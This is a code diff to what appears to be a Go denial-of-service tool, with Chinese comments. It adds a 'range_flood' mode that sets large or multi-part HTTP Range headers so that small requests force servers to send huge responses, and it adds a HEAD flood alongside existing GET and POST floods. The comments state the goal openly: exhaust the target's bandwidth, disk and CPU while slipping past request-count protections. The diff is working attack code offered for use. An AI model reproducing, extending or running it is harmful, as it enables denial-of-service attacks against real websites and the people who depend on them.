@@ -1415,7 +1415,7 @@ func dialHTTPConn(tgt string, useTLS bool) net.Conn {	u, err := url.Parse(tgt)
 // 每连接只写 pipeDepth 个请求即主动重连：HTTP/1.1 管道化并非所有
 // 服务器都支持（RST 时写失败自动重连），小批量写入兼容性最好，
 // 同时避免单连接无限堆积未响应请求被目标/中间设备清理。
-func (s *AttackSession) runRawHTTPLoop(seed int, targets []string, dur time.Duration, method string, bodySize int) {
+func (s *AttackSession) runRawHTTPLoop(seed int, targets []string, dur time.Duration, method string, bodySize int, rangeMode bool) {
 	const connsPerThread = 6
 	const pipeDepth = 8
 
@@ -1479,6 +1479,19 @@ func (s *AttackSession) runRawHTTPLoop(seed int, targets []string, dur time.Dura
 						rng.Read(body)
 					}
 					req := buildL7Request(method, tgt, body, rng)
+					// Range 模式（range_flood）：强制服务器返回大响应——
+					// 攻击者小请求换目标大响应（读磁盘+发送，响应放大型）
+					if rangeMode {
+						switch rng.Intn(3) {
+						case 0:
+							req.Header.Set("Range", "bytes=0-")
+						case 1:
+							req.Header.Set("Range", fmt.Sprintf("bytes=0-%d", 1048576*(1+rng.Intn(64))))
+						default:
+							// 多段 Range：让服务器拼接多个分片
+							req.Header.Set("Range", fmt.Sprintf("bytes=0-1048575,%d-%d", 1048576*(2+rng.Intn(16)), 1048576*(3+rng.Intn(16))))
+						}
+					}
 					reqBytes := estimateRequestBytes(method, req.URL.String(), body, req.Header.Get("User-Agent"))
 					// 按实际请求字节限速（BPS 维度真正生效；旧的 checkRate(1) 只限 PPS）
 					if !s.checkRate(reqBytes) {
@@ -1514,8 +1527,9 @@ func StartHTTPFlood(target string, duration int, threads int) *AttackSession {
 	})
 }
 
-func StartHTTPFloodEx(cfg AttackConfig) *AttackSession {
-	s := NewAttackSession(cfg.Target, cfg.Targets, "http_flood", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
+// startHTTPFloodCore 三种 HTTP 洪水共用的启动骨架（http_flood / head_flood / range_flood）
+func startHTTPFloodCore(cfg AttackConfig, methodName, httpMethod string, rangeMode bool) *AttackSession {
+	s := NewAttackSession(cfg.Target, cfg.Targets, methodName, newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
 	if cfg.Duration < 1 {
 		cfg.Duration = 60
 	}
@@ -1537,7 +1551,7 @@ func StartHTTPFloodEx(cfg AttackConfig) *AttackSession {
 			wg.Add(1)
 			go func(seed int) {
 				defer wg.Done()
-				s.runRawHTTPLoop(seed, targets, dur, "GET", 0)
+				s.runRawHTTPLoop(seed, targets, dur, httpMethod, 0, rangeMode)
 			}(i)
 		}
 
@@ -1553,6 +1567,24 @@ func StartHTTPFloodEx(cfg AttackConfig) *AttackSession {
 	}()
 
 	return s
+}
+
+func StartHTTPFloodEx(cfg AttackConfig) *AttackSession {
+	return startHTTPFloodCore(cfg, "http_flood", "GET", false)
+}
+
+// StartHEADFloodEx HEAD 洪水：响应仅响应头（无 body），目标仍要完整处理
+// 请求与路由/权限/缓存逻辑（MHDDoS 标配方法之一）。
+func StartHEADFloodEx(cfg AttackConfig) *AttackSession {
+	return startHTTPFloodCore(cfg, "head_flood", "HEAD", false)
+}
+
+// StartRangeFloodEx Range 洪水（响应放大）：请求携带 Range 头强制服务器
+// 返回大响应（读取并发送大文件/分段拼接）——攻击者每字节请求换目标
+// 数百倍响应流量，打目标上行带宽 + 磁盘读取 + CPU，且绕过只按请求数
+// 统计的防护（请求率低、响应巨大）。
+func StartRangeFloodEx(cfg AttackConfig) *AttackSession {
+	return startHTTPFloodCore(cfg, "range_flood", "GET", true)
 }
 
 // StartPOSTFloodEx POST 洪水：随机 body（大小由 PacketSize 控制，默认 512B），
@@ -1585,7 +1617,7 @@ func StartPOSTFloodEx(cfg AttackConfig) *AttackSession {
 			wg.Add(1)
 			go func(seed int) {
 				defer wg.Done()
-				s.runRawHTTPLoop(seed, targets, dur, "POST", bodySize)
+				s.runRawHTTPLoop(seed, targets, dur, "POST", bodySize, false)
 			}(i)
 		}
 
